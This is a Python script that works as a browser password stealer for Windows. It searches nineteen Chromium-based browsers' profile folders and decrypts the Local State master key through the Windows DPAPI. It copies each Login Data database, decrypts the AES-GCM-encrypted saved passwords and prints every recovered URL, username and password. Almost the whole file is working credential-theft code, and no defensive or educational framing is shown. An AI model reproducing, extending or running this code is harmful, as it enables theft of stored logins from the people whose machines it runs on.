
# created by Noah Pearson (6e6f6168 aka vanillablunt)

import base64
import json
import os
import random
import shutil
import sqlite3
import string
import tempfile
import traceback
import time
import sys
from Crypto.Cipher import AES

from ctypes import c_buffer, Structure, POINTER, c_char, WinDLL, byref, c_void_p, create_string_buffer, memmove, sizeof
from ctypes.wintypes import DWORD, BOOL, LPWSTR, HWND, LPCWSTR, LPVOID

date = time.strftime("%d%m%Y_%H%M%S")
tmp = tempfile.gettempdir()

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', DWORD),
        ('pbData', POINTER(c_char))
    ]

class CRYPTPROTECT_PROMPTSTRUCT(Structure):
    _fields_ = [
        ('cbSize', DWORD),
        ('dwPromptFlags', DWORD),
        ('hwndApp', HWND),
        ('szPrompt', LPCWSTR),
    ]

def DecryptData(data):
    bufferIn = c_buffer(data,len(data))
    blobOut = DATA_BLOB()
    WinDLL('crypt32', use_last_error=True).CryptUnprotectData(byref(DATA_BLOB(len(data),c_buffer(data,len(data)))),None,None,None,None,0,byref(blobOut))
    buffer = create_string_buffer(blobOut.cbData)
    memmove(buffer, blobOut.pbData, sizeof(buffer))
    WinDLL('kernel32', use_last_error=True).LocalFree(blobOut.pbData);
    password = buffer.raw
    return password


chromium_browsers = [
    (u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
    (u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
    (u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
    (u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
    (u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
    (u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
    (u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
    (u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
    (u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
    (u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
    (u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
    (u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
    (u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
    (u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
    (u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
    (u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
    (u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
    (u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
    (u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data')
]

existing_browsers = []
exploitable_browsers = []

logins = []

for browser in chromium_browsers:
    browser_location = browser[1].replace("{LOCALAPPDATA}",os.getenv("localappdata")).replace("{APPDATA}",os.getenv("appdata"))
    if os.path.exists(browser_location):
        existing_browsers.append(browser_location)

for browser_location in existing_browsers:
    if os.path.exists(browser_location+"\\Local State") and os.path.exists(browser_location+"\\Default\\Login Data"):
        exploitable_browsers.append(browser_location)

for browser_location in exploitable_browsers:
    with open(browser_location+"\\Local State") as local_state_file:
        key = DecryptData(base64.b64decode(json.load(local_state_file)["os_crypt"]["encrypted_key"])[5:])
        copied_database = str(os.getenv('temp')+"\\bigmeme")
        shutil.copyfile(browser_location+"\\Default\\Login Data",copied_database)
        conn = sqlite3.connect(copied_database)
        for url, username, password in conn.cursor().execute('SELECT action_url, username_value, password_value FROM logins').fetchall():
            if password:
                if password[:3] == b'v10':
                    password = AES.new(key, AES.MODE_GCM, password[3:15]).decrypt(password[15:])[:-16].decode()
                    logins.append((url,username,password))
        conn.close()
        os.remove(copied_database)

for login in logins:
    if login[0] and login[1] and login[2]:
        sys.stdout.write("URL: "+login[0]+"\n")
        sys.stdout.write("Username: "+login[1]+"\n")
        sys.stdout.write("Password: "+login[2]+"\n")
        sys.stdout.write(""+"\n")
